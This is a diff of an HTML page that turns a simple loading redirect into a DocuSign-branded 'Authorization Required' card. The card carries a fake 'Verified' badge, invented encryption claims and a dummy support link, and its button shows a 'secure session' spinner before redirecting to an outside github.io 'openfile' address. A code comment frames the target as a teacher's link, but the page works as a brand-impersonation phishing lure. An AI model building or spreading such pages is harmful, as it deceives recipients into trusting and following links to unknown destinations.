@@ -3,22 +3,152 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Opening Document | Secure Redirect</title>
+    <title>Document Authorization | DocuSign Style</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
+
         body {
-            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
-            background: #ffffff;
+            font-family: 'Segoe UI', 'Roboto', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #f5f7fc;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
+            padding: 24px;
         }
-        .loading-container {
+
+        /* DocuSign-inspired card */
+        .docusign-card {
+            max-width: 540px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.02);
+            overflow: hidden;
+            transition: transform 0.2s ease;
+        }
+
+        /* subtle header bar */
+        .card-header {
+            background: #fafbfc;
+            padding: 20px 28px 12px 28px;
+            border-bottom: 1px solid #eef2f6;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-icon {
+            background: #0b5c9e;
+            width: 32px;
+            height: 32px;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 700;
+            font-size: 18px;
+        }
+
+        .logo-text {
+            font-size: 16px;
+            font-weight: 600;
+            color: #1e3a5f;
+            letter-spacing: -0.2px;
+        }
+
+        .badge {
+            margin-left: auto;
+            background: #eef2fa;
+            padding: 4px 12px;
+            border-radius: 40px;
+            font-size: 12px;
+            color: #1e3a5f;
+        }
+
+        /* main content */
+        .card-body {
+            padding: 28px;
+        }
+
+        .icon-large {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 26px;
+            font-weight: 600;
+            color: #0a2540;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .auth-message {
+            background: #fef9e6;
+            border-left: 4px solid #e8a020;
+            padding: 18px 20px;
+            border-radius: 12px;
+            margin-bottom: 28px;
+            font-size: 15px;
+            line-height: 1.5;
+            color: #2d3e50;
+        }
+
+        .auth-message strong {
+            color: #c97d0e;
+        }
+
+        .button-group {
+            text-align: center;
+        }
+
+        .access-btn {
+            background: #0b5c9e;
+            color: white;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 40px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s, box-shadow 0.2s;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+        }
+
+        .access-btn:hover {
+            background: #084c82;
+            box-shadow: 0 4px 12px rgba(11,92,158,0.25);
+        }
+
+        .support-footer {
+            margin-top: 32px;
+            text-align: center;
+            font-size: 12px;
+            color: #8b9ab0;
+            border-top: 1px solid #edf2f7;
+            padding-top: 20px;
+        }
+
+        .support-footer a {
+            color: #0b5c9e;
+            text-decoration: none;
+        }
+
+        .support-footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Loading overlay (same style, polished) */
+        .loading-overlay {
             position: fixed;
             top: 0;
             left: 0;
@@ -29,94 +159,137 @@
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            z-index: 1000;
+            z-index: 2000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
         }
+
+        .loading-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
         .spinner {
-            width: 56px;
-            height: 56px;
+            width: 52px;
+            height: 52px;
             border: 4px solid #e9ecef;
-            border-top-color: #1a73e8;
+            border-top-color: #0b5c9e;
             border-right-color: #34a853;
             border-bottom-color: #fbbc04;
             border-left-color: #ea4335;
             border-radius: 50%;
             animation: spin 0.9s cubic-bezier(0.4, 0, 0.2, 1) infinite;
-            margin-bottom: 28px;
+            margin-bottom: 24px;
         }
+
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
-        .primary-text {
-            font-size: 26px;
+
+        .loading-text {
+            font-size: 24px;
             font-weight: 500;
             color: #202124;
-            letter-spacing: -0.2px;
             display: flex;
             gap: 4px;
-            flex-wrap: wrap;
-            justify-content: center;
         }
-        .primary-text span {
-            animation: gentlePulse 1.6s infinite ease-in-out;
-            animation-delay: calc(0.08s * var(--i, 0));
+
+        .loading-text span {
+            animation: gentlePulse 1.5s infinite ease-in-out;
+            animation-delay: calc(0.07s * var(--i, 0));
         }
-        .primary-text span:nth-child(1) { --i: 0; }
-        .primary-text span:nth-child(2) { --i: 1; }
-        .primary-text span:nth-child(3) { --i: 2; }
-        .primary-text span:nth-child(4) { --i: 3; }
-        .primary-text span:nth-child(5) { --i: 4; }
-        .primary-text span:nth-child(6) { --i: 5; }
-        .primary-text span:nth-child(7) { --i: 6; }
-        .primary-text span:nth-child(8) { --i: 7; }
-        .primary-text span:nth-child(9) { --i: 8; }
-        .primary-text span:nth-child(10) { --i: 9; }
-        .primary-text span:nth-child(11) { --i: 10; }
-        .primary-text span:nth-child(12) { --i: 11; }
+
+        .loading-text span:nth-child(1) { --i: 0; }
+        .loading-text span:nth-child(2) { --i: 1; }
+        .loading-text span:nth-child(3) { --i: 2; }
+        .loading-text span:nth-child(4) { --i: 3; }
+        .loading-text span:nth-child(5) { --i: 4; }
+        .loading-text span:nth-child(6) { --i: 5; }
+        .loading-text span:nth-child(7) { --i: 6; }
+        .loading-text span:nth-child(8) { --i: 7; }
+        .loading-text span:nth-child(9) { --i: 8; }
+        .loading-text span:nth-child(10) { --i: 9; }
+        .loading-text span:nth-child(11) { --i: 10; }
+        .loading-text span:nth-child(12) { --i: 11; }
+
         @keyframes gentlePulse {
             0%, 100% { opacity: 0.4; transform: translateY(0); }
             50% { opacity: 1; transform: translateY(-2px); }
         }
-        .secondary-text {
-            font-size: 14px;
-            color: #5f6368;
-            margin-top: 12px;
-        }
-        .badge {
-            margin-top: 28px;
-            font-size: 12px;
-            color: #8e9aaf;
-            background: #f8f9fa;
-            padding: 6px 16px;
-            border-radius: 40px;
+
+        .loading-sub {
+            margin-top: 16px;
+            font-size: 13px;
+            color: #6c7a91;
         }
     </style>
 </head>
 <body>
-<div class="loading-container" id="loadingScreen">
-    <div class="spinner"></div>
-    <div class="primary-text">
-        <span>O</span><span>p</span><span>e</span><span>n</span><span>i</span><span>n</span><span>g</span>
-        <span style="margin-left: 6px;">d</span><span>o</span><span>c</span><span>u</span><span>m</span><span>e</span><span>n</span><span>t</span><span>.</span><span>.</span><span>.</span>
+
+<div class="docusign-card">
+    <div class="card-header">
+        <div class="logo-icon">✍️</div>
+        <div class="logo-text">DocuSign Secure Access</div>
+        <div class="badge">Verified</div>
     </div>
-    <div class="secondary-text">Establishing secure connection · Please wait</div>
-    <div class="badge">Verified · Encrypted transfer</div>
+    <div class="card-body">
+        <div class="icon-large">
+            <svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15h-2v-2h2v2zm0-4h-2V7h2v6z" fill="#0b5c9e"/>
+            </svg>
+        </div>
+        <h1>Authorization Required</h1>
+        <div class="auth-message">
+            <strong>🔐 Secure access request</strong> — To view this document, your identity must be authorized. No passwords or email entry required — simply confirm your access below.
+        </div>
+        <div class="button-group">
+            <button class="access-btn" id="accessBtn">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 4C7 4 2.73 7.11 1 11.5 2.73 15.89 7 19 12 19s9.27-3.11 11-7.5C21.27 7.11 17 4 12 4zm0 12.5c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z" fill="white"/>
+                </svg>
+                Authorize & Access Document
+            </button>
+        </div>
+        <div class="support-footer">
+            Need help? <a href="#">Contact DocuSign Support</a> · Secured by industry-standard encryption
+        </div>
+    </div>
+</div>
+
+<!-- Loading overlay -->
+<div id="loadingOverlay" class="loading-overlay">
+    <div class="spinner"></div>
+    <div class="loading-text">
+        <span>O</span><span>p</span><span>e</span><span>n</span><span>i</span><span>n</span><span>g</span>
+        <span style="margin-left: 4px;">d</span><span>o</span><span>c</span><span>u</span><span>m</span><span>e</span><span>n</span><span>t</span><span>.</span><span>.</span><span>.</span>
+    </div>
+    <div class="loading-sub">Establishing secure session · Please wait</div>
 </div>
 
 <script>
-    // =============================================
-    // 🔗 PASTE YOUR TEACHER'S LINK HERE
-    // =============================================
+    // ============================================================
+    // 🔗 PASTE YOUR TEACHER'S LINK BELOW (replace the example URL)
+    // ============================================================
     const TARGET_URL = "https://source-alt1.github.io/openfile/";
 
-    // Validate and redirect after 1.6 seconds
-    try {
-        new URL(TARGET_URL);
+    const accessBtn = document.getElementById('accessBtn');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    let redirectTriggered = false;
+
+    function showLoadingAndRedirect() {
+        if (redirectTriggered) return;
+        redirectTriggered = true;
+        loadingOverlay.classList.add('active');
         setTimeout(() => {
             window.location.href = TARGET_URL;
         }, 1600);
-    } catch(e) {
-        document.body.innerHTML = "<div style='text-align:center; margin-top:50px;'><h2>Configuration error</h2><p>Please set a valid redirect link in the code.</p></div>";
     }
+
+    accessBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        showLoadingAndRedirect();
+    });
 </script>
 </body>
 </html>
